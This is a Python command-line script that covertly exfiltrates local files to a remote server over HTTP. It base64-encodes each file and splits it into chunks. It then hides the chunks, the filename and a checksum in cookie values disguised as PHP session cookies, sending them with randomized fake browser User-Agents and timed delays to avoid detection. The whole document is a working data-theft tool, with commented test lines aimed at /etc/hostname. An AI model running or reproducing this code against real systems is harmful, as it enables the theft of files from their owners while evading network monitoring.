#!/usr/bin/env python3

import requests, argparse, logging, sys, os
import zlib
import time
import base64
import random
#from struct import *

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
# Constants
USER_AGENTS = [
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/2.02E (Win95; U)",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	"Opera/7.50 (Windows XP; U)",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/28.0.1469.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"]
HEADERS = {'content-type': 'application/json', 'User-Agent': random.choice(USER_AGENTS)}

# Packet configuration
INIT_PACKET_COOKIE = "sessionID"
PACKET_COOKIE = "PHPSESSID"
TERMINATION_COOKIE = "sessID0"
COOKIE_DELIMITER = ".."
DATA_END = "00000000000000"

TIME_DELAY = 0.5

def read_file(file_path):
    logging.info(f'Read File: {file_path}')
    try:
        # Load file
        fh = open(file_path, "rb")
        data = fh.read()
        fh.close()
    except:
        print("Error Read File")
        exit(-1)
    return data

def encode_data(data, file_path):
    max_packet_size=1024
    # Split file to chunks by size:
    chunks = []
    data_base64 = base64.b64encode(data) # Base64 Encode for ASCII
    print(data_base64)
    data_base64 = data_base64.decode('ascii').replace('=','').encode('ascii')
    checksum = zlib.crc32(data_base64) # Calculate CRC32 for later verification
    logging.info(f'\tChecksum for : {checksum}')
    #data_base64 = data_base64.decode('ascii')
    #print(str(data_base64))
    chunks = [data_base64[i:i + max_packet_size] for i in range(0, len(data_base64), max_packet_size)]  # Split into chunks
    head, tail = os.path.split(file_path)
    return chunks, checksum, tail
    

def send_init(chunks, checksum, tail):
    init_payload = tail + COOKIE_DELIMITER + str(checksum) + COOKIE_DELIMITER + str(len(chunks))
    payload = {INIT_PACKET_COOKIE: init_payload}
    requests.get(URL, cookies=payload, headers=HEADERS)
    logging.info(f'Sent initiation package. Total of {len(chunks)}+2 chunks.')
    time.sleep(1)


def send_data(chunks):
    # Send data
    current_chunk = 0
    for chunk in chunks:
        print("SEND DATA: "+ chunk.decode('unicode_escape'))
        payload = {PACKET_COOKIE + str(current_chunk): chunk.decode('unicode_escape')}
        try:
            requests.get(URL, cookies=payload, headers=HEADERS)
        except:
            print("No Connection")
        current_chunk += 1
        time.sleep(TIME_DELAY)
        
    return current_chunk

def send_term(current_chunk):
    #Termination packet
    data = DATA_END + str(current_chunk)
    payload = {TERMINATION_COOKIE: data}
    requests.get(URL, cookies=payload, headers=HEADERS)
    logging.info("Sent termination packets and total of %s packets." % current_chunk)
    time.sleep(2)

def main():
    print("| Start \n")
    for file_path in args.file:
        data = read_file(file_path) 
        chunks, checksum, tail = encode_data(data, file_path)
        send_init(chunks, checksum, tail)
        current_chunk = send_data(chunks)
        send_term(current_chunk)
    print("| End")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = '')
    parser.add_argument('-u', '--url', default='http://127.0.0.1', type=str, help='Remote Server IP')
    parser.add_argument('-p', '--port', default=80, type=int, help='Remote Server Port')
    parser.add_argument('-f', '--file', nargs='*', required=True, type=str, help='File to Download')
    parser.add_argument('-log', '--level', default=20, type=int, help='Set Logging Level')
    args = parser.parse_args()
    print(args.file)
    
    URL = args.url+":"+str(args.port)




    # t = "a2FsaQo"
    # c = zlib.crc32(str.encode(t)) 
    # print(str(c))
    # file_path = "/etc/hostname"
    # data = read_file(file_path) 
    # encode_data(data, file_path)
    
    # print(data.strip())

    # IamDone = base64.b64encode(data.encode('ascii'))
    # print(IamDone)
    # print(IamDone.decode('ascii').replace("=",""))
    # x = IamDone.decode('ascii').replace("=","")
    # checksum = zlib.crc32(IamDone)     
    # print(str(checksum))
    # print(zlib.crc32(x.encode('ascii')))


    # exit()

    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
    main()